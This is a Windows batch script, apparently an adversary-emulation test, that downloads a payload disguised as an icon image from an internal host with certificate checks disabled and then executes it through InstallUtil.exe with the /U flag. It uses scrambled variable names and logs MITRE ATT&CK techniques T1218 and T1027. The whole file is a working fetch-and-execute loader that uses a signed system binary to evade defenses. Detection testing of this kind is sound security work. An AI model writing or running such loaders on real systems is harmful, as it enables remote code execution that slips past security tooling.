@echo off
SETLOCAL EnableDelayedExpansion

REM Placeholder constant declarations (random-named SET vars)
SET zxq=%APPDATA%\11077\d1bf2ff4
SET wert=dc9ec673.txt
SET cvbn=https://10.0.0.49/stage/2/icon.png?11077-7
SET uiop=ITZEL-S2BO
SET asdf=11077
SET ghjk=7
SET tyui=%PUBLIC%\\macula-simulations.log

REM Capture timestamp once
SET tsvar=!DATE!/!TIME!

REM Debug log: heartbeat start
echo [!tsvar!][DEBUG][!uiop!][!asdf!]: heartbeat_start>> "!tyui!" 2>nul

REM Step 1: Heartbeat fetch
curl -k -s -o "!zxq!\!wert!" "!cvbn!"
if errorlevel 1 (
    echo [!tsvar!][DEBUG][!uiop!][!asdf!]: heartbeat_fail=!errorlevel!>> "!tyui!" 2>nul
    goto :cleanup
)
echo [!tsvar!][DEBUG][!uiop!][!asdf!]: heartbeat_complete=0>> "!tyui!" 2>nul

REM Step 2: Change working directory
echo [!tsvar!][DEBUG][!uiop!][!asdf!]: chdir_start>> "!tyui!" 2>nul
cd /d "!zxq!" >nul 2>&1
if errorlevel 1 (
    echo [!tsvar!][DEBUG][!uiop!][!asdf!]: chdir_result=!errorlevel!>> "!tyui!" 2>nul
    goto :cleanup
)
echo [!tsvar!][DEBUG][!uiop!][!asdf!]: chdir_result=0>> "!tyui!" 2>nul

REM Step 3: Invoke InstallUtil with /U flag
echo [!tsvar!][DEBUG][!uiop!][!asdf!]: installutil_start>> "!tyui!" 2>nul
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U "!wert!" >NUL 2>&1
if errorlevel 1 (
    echo [!tsvar!][DEBUG][!uiop!][!asdf!]: installutil_result=!errorlevel!>> "!tyui!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!uiop!][!asdf!]: installutil_result=0>> "!tyui!" 2>nul
)

:cleanup
REM Log TTP lines
REM T1218: System Binary Proxy Execution
echo [!tsvar!][TTP][!uiop!][!asdf!]: T1218^|System Binary Proxy Execution=OK:>> "!tyui!" 2>nul
REM T1027: Obfuscated Files or Information
echo [!tsvar!][TTP][!uiop!][!asdf!]: T1027^|Obfuscated Files or Information=OK:>> "!tyui!" 2>nul

ENDLOCAL
exit /b 0